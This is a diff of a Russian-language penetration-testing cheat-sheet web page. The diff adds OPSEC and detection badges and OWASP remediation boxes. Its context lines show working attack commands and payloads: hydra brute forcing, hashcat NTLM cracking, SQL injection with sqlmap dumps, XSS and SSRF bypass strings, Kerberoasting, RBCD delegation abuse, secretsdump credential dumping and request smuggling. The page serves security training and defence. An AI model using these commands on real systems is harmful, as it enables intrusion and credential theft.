@@ -581,7 +581,7 @@ kr brute http://<span class="ph-rhost">10.10.10.1</span>/api/v1 -w wordlist.txt 
 
         <article class="card cmd-card" id="cmd-hydra" data-tags="attack brute-force">
           <div class="cmd-head">
-            <h3>hydra — брутфорс сетевых сервисов</h3><span class="diff diff-base">База</span>
+            <h3>hydra — брутфорс сетевых сервисов</h3><span class="diff diff-base">База</span><span class="opsec-badge opsec-lockout" title="Высокий риск блокировки учётной записи">Account Lockout Risk</span><span class="opsec-badge opsec-loud" title="Генерирует много трафика и записей в логах">OPSEC: Loud</span>
           </div>
           <pre class="code">hydra -L users.txt -P pass.txt ssh://target_ip
 hydra -l admin -P pass.txt target_ip http-post-form "/login:u=^USER^&p=^PASS^:F=incorrect"
@@ -609,7 +609,7 @@ hashcat -m 1000 -a 0 nt.hashes rockyou.txt           # NTLM (Windows)</pre>
         <!--ATTACK2-->
         <article class="card cmd-card" id="cmd-sqli" data-tags="attack web">
           <div class="cmd-head">
-            <h3>SQLi — SQL-инъекции</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>SQLi — SQL-инъекции</h3><span class="diff diff-pro">Продвинутый</span><span class="opsec-badge opsec-loud" title="sqlmap оставляет явные следы в логах WAF/веб-сервера">OPSEC: Loud (sqlmap)</span>
           </div>
           <pre class="code"># Классические тесты (в полях формы / GET-параметрах):
 ' OR 1=1 --
@@ -620,7 +620,8 @@ hashcat -m 1000 -a 0 nt.hashes rockyou.txt           # NTLM (Windows)</pre>
 sqlmap -u "http://target/page?id=1" --dbs
 sqlmap -u "http://target/page?id=1" -D shop -T users --dump</pre>
           <p class="cmd-note">Суть: пользовательский ввод попадает в SQL-запрос без экранирования. Признаки: ошибки БД,
-            асимметрия ответов на «/». Защита: prepared statements (параметризованные запросы) — всегда.</p>
+            асимметрия ответов на «/».</p>
+          <div class="remediation-box"><b>Как фиксить в коде (OWASP):</b> используйте параметризованные запросы (Prepared Statements / ORM) вместо конкатенации строк, а также принцип наименьших привилегий для учётной записи БД.</div>
           <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
               data-tag="web">#web</span></div>
         </article>
@@ -633,7 +634,8 @@ sqlmap -u "http://target/page?id=1" -D shop -T users --dump</pre>
 &lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;</pre>
           <p class="cmd-note">Скрипт выполняется в браузере жертвы: кража cookie, сессий, фишинг внутри доверенного
-            сайта. Защита: экранирование вывода (context-aware encoding), CSP-заголовки.</p>
+            сайта.</p>
+          <div class="remediation-box"><b>Как фиксить в коде (OWASP):</b> контекстное экранирование вывода (<code>textContent</code> вместо <code>innerHTML</code>), санитизация HTML (DOMPurify), флаги <code>HttpOnly</code> для cookie и строгий <code>Content-Security-Policy</code> (CSP).</div>
           <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
               data-tag="web">#web</span></div>
         </article>
@@ -656,7 +658,8 @@ http://[::1]:80/                             # IPv6 loopback
 http://0177.0.0.1/                           # Восьмеричный формат (Octal)
 http://2130706433/                           # Десятичный IP (Decimal dword)
 http://localtest.me/                         # DNS-запись, резолвящаяся в 127.0.0.1</pre>
-          <p class="cmd-note">Уязвимый сервер выполняет HTTP-запрос по указанному пользователем URL. Позволяет читать внутренние API, пробивать облачные метаданные и обходить сетевые экраны. Защита: жесткий whitelist доверенных доменов, IMDSv2 (Session Token), запрет перенаправлений (redirects).</p>
+          <p class="cmd-note">Уязвимый сервер выполняет HTTP-запрос по указанному пользователем URL. Позволяет читать внутренние API, пробивать облачные метаданные и обходить сетевые экраны.</p>
+          <div class="remediation-box"><b>Как фиксить в коде (OWASP):</b> жёсткий allowlist доверенных доменов и портов, запрет HTTP-редиректов, блокировка приватных подсетей (<code>127.0.0.0/8</code>, <code>169.254.169.254</code>) после DNS-резолва и включение IMDSv2 в облаке.</div>
           <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
               data-tag="web">#web</span><span class="tag-link" data-tag="cloud">#cloud</span></div>
         </article>
@@ -848,7 +851,7 @@ bloodhound-python -d domain.local -u 'low_user' -p 'Pass123!' -gc dc.domain.loca
 
         <article class="card cmd-card" id="cmd-ad-kerberoast" data-tags="attack ad brute-force">
           <div class="cmd-head">
-            <h3>Kerberoasting &amp; AS-REP Roasting</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>Kerberoasting &amp; AS-REP Roasting</h3><span class="diff diff-pro">Продвинутый</span><span class="opsec-badge opsec-event" title="Запрос TGS/TGT фиксируется в контроллере домена">Event ID 4769 / 4768</span>
           </div>
           <pre class="code"># 1. Kerberoasting — запрос тикетов TGS для сервисных учетных записей (SPN):
 impacket-GetUserSPNs domain.local/user:'Password' -dc-ip 10.10.10.1 -request -outputfile kerb.hashes
@@ -1289,7 +1292,7 @@ ssh -p 8022 user@127.0.0.1</pre>
 
         <article class="card cmd-card" id="cmd-ad-netexec" data-tags="ad attack recon windows">
           <div class="cmd-head">
-            <h3>Initial Access &amp; Recon: NetExec (nxc) &amp; BloodHound Cypher</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>Initial Access &amp; Recon: NetExec (nxc) &amp; BloodHound Cypher</h3><span class="diff diff-pro">Продвинутый</span><span class="opsec-badge opsec-loud" title="Массовый перебор и сбор LDAP/SMB оставляет заметные следы">OPSEC: Loud</span>
           </div>
           <pre class="code"># 1. Быстрая разведка подсети и поиск SMB Signing:
 nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
@@ -1312,7 +1315,7 @@ MATCH (u:User)-[r:GenericAll|WriteDacl]->(c:Computer) RETURN u,r,c;</pre>
 
         <article class="card cmd-card" id="cmd-ad-delegation" data-tags="ad kerberos attack privesc">
           <div class="cmd-head">
-            <h3>Kerberos &amp; Delegation: Unconstrained, Constrained, RBCD &amp; Shadow Credentials</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>Kerberos &amp; Delegation: Unconstrained, Constrained, RBCD &amp; Shadow Credentials</h3><span class="diff diff-pro">Продвинутый</span><span class="opsec-badge opsec-event" title="Изменение атрибутов AD и запросы S4U2">Event ID 4769 / 5136</span>
           </div>
           <pre class="code"># 1. Resource-Based Constrained Delegation (RBCD) — эскалация до SYSTEM на целевом ПК:
 # Создаем фейковый машинный аккаунт в домене (MachineAccountQuota >= 1):
@@ -1395,7 +1398,7 @@ impacket-secretsdump domain.local/'low_user':'NewPass'@<span class="ph-rhost">10
 
         <article class="card cmd-card" id="cmd-waf-smuggling" data-tags="evasion web attack owasp">
           <div class="cmd-head">
-            <h3>WAF Evasion: HTTP Request Smuggling (CL.TE / TE.CL) &amp; Parameter Pollution (HPP)</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>WAF Evasion: HTTP Request Smuggling (CL.TE / TE.CL) &amp; Parameter Pollution (HPP)</h3><span class="diff diff-pro">Продвинутый</span><span class="opsec-badge opsec-loud" title="Аномальные HTTP-запросы часто триггерят WAF/IDS">OPSEC: Loud</span>
           </div>
           <pre class="code"># 1. HTTP Request Smuggling (CL.TE рассинхронизация заголовков):
 # Фронтенд использует Content-Length, а бэкенд обрабатывает Transfer-Encoding:
